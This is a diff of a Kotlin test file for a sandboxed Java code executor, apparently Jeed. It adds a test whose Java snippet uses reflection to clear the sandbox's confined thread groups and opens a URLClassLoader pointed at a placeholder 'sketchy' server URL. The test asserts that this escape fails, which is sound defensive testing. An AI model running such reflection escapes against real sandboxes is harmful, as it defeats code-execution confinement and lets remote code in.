@@ -953,7 +953,7 @@ while (true) {
         goodResult should haveOutput("AAAAAAAAAA")
     }
 
-    "f:should not allow access to the compiler" {
+    "should not allow access to the compiler" {
         val result = Source.fromSnippet("""
 import java.lang.reflect.*;
 
@@ -974,8 +974,30 @@ try {
     e.printStackTrace();
 }
 
-//Source.fromSnippet("System.out.println(5);").compile().execute();
             """.trim()).compile().execute()
+        result.output shouldNot contain("!")
+    }
+
+    "should not allow reflection to disable sandboxing" {
+        val SCompanionSSandbox = "\$Companion\$Sandbox"
+        val result = Source.fromSnippet("""
+            
+import java.lang.reflect.*;
+import java.net.*;
+import java.util.Map;
+
+try {
+    Class<?> sandboxClass = Class.forName("edu.illinois.cs.cs125.jeed.core.JeedExecutor$SCompanionSSandbox");
+    Field confinedThreadGroupsField = sandboxClass.getDeclaredField("confinedThreadGroups");
+    confinedThreadGroupsField.setAccessible(true);
+    Map confinedThreadGroups = (Map) confinedThreadGroupsField.get(null);
+    confinedThreadGroups.clear();
+    URLClassLoader loader = new URLClassLoader(new URL[] { new URL("https://example.com/sketchy/server") });
+    System.out.println("Escaped sandbox!");
+} catch (Exception e) {
+    e.printStackTrace();
+}
+        """.trim()).compile().execute()
         println(result.output)
         result.output shouldNot contain("!")
     }
